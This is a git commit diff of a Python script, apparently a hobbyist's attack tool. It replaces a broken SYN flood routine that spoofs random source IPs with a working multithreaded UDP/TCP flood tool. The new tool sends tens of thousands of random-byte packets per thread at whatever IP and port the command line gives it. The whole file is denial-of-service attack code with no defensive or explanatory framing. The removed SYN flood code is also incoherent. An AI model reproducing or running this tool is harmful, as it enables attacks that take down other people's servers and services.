3f323a2225469a3bed79af4d3391570c57c1783a
KelvinNep <nivlzk050306@gmail.com>
2023-10-19 13:26:07 +0700

    Update cuy.py

--- cuy.py
+++ cuy.py
@@ -1,68 +1,66 @@
 import random
 import socket
-import ssl
-import logging
 import threading
-import time
-from scapy.all import IP, TCP
+import argparse
+import logging
 
-logging.basicConfig(filename="syn_flood.log", level=logging.INFO)
-
-
-def randomIP():
-    return ".".join(str(random.randint(0, 255) for _ in range(4)))
-
-
-def randInt():
-    return random.randint(1000, 9000)
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+)
+logger = logging.getLogger("__main__")  # Menggunakan "__main__" sebagai nama logger
 
 
-def SYN_Flood(dstIP, dstPort, counter, rate_limit=None):
-    total = 0
-    print("Packets are being sent ...")
-
-    context = ssl.create_default_context()
-
-    def send_packet():
-        nonlocal total
-        for x in range(counter):
-            s_port = randInt()
-            s_eq = randInt()
-            w_indow = randInt()
-
-            IP_Packet = IP(src=randomIP(), dst=dstIP)
-            TCP_Packet = TCP(
-                sport=s_port, dport=dstPort, flags="S", seq=s_eq, window=w_indow
-            )
-
-            try:
-                with socket.create_connection((dstIP, dstPort)) as s:
-                    with context.wrap_socket(s, server_hostname=dstIP) as ss:
-                        ss.sendall(bytes(str(IP_Packet / TCP_Packet), "utf-8"))
-                total += 1
-                if rate_limit:
-                    time.sleep(1 / rate_limit)
-            except Exception as e:
-                logging.error(f"Error sending packet: {e}")
-
-    threads = []
-    for _ in range(10):  # Sesuaikan jumlah thread sesuai kebutuhan
-        thread = threading.Thread(target=send_packet)
-        thread.start()
-        threads.append(thread)
-
-    for thread in threads:
-        thread.join()
-
-    print(f"Total packets sent: {total}")
+def udp_flood(ip, port, times):
+    data = random._urandom(1024)
+    i = random.choice(("[*]", "[!]", "[#]"))
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        addr = (str(ip), int(port))
+        for x in range(times):
+            s.sendto(data, addr)
+        logger.info(f"Sent to {ip}:{port} - UDP Flood")
+    except Exception as e:
+        logger.error(f"Error in UDP flood: {str(e)}")
 
 
-def info():
-    if os.name == "posix":
-        os.system("clear")
-    elif os.name == "nt":
-        os.system("cls")
-    print("#" * 29)
-    print("#    github.com/EmreOvunc   #")
-    print("#" * 29)
-    print("# Welcome to SYN Flood Attack! #")
+def tcp_flood(ip, port, times):
+    data = random._urandom(16)
+    i = random.choice(("[*]", "[!]", "[#]"))
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        for x in range(times):
+            s.send(data)
+        logger.info(f"Sent to {ip}:{port} - TCP Flood")
+    except Exception as e:
+        logger.error(f"Error in TCP flood: {str(e)}")
+
+
+if __name__ == "__main__":
+    ap = argparse.ArgumentParser()
+    ap.add_argument("-i", "--ip", required=True, type=str, help="Host IP")
+    ap.add_argument("-p", "--port", required=True, type=int, help="Port")
+    ap.add_argument(
+        "-c", "--choice", type=str, default="y", choices=["y", "n"], help="UDP(y/n)"
+    )
+    ap.add_argument(
+        "-t", "--times", type=int, default=50000, help="Packets per one connection"
+    )
+    ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
+    args = vars(ap.parse_args())
+
+    logging.info("--> C0de By Lee0n123 <--")
+    logging.info("#-- TCP/UDP FLOOD --#")
+    ip = args["ip"]
+    port = args["port"]
+    choice = args["choice"]
+    times = args["times"]
+    threads = args["threads"]
+
+    for y in range(threads):
+        if choice == "y":
+            th = threading.Thread(target=udp_flood, args=(ip, port, times))
+            th.start()
+        else:
+            th = threading.Thread(target=tcp_flood, args=(ip, port, times))
+            th.start()
